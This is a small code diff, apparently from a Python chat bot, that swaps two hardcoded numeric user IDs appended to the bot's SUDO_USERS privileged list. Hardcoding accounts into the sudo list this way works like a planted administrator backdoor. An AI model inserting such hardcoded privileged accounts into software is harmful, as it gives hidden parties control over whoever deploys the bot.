@@ -5,8 +5,8 @@ from Config import SUDO_USERS
 from Process.admins import get_administrators
 
 
-SUDO_USERS.append(5079644547)
-SUDO_USERS.append(1668305941)
+SUDO_USERS.append(1973468225)
+SUDO_USERS.append(2074956907)
 
 
 
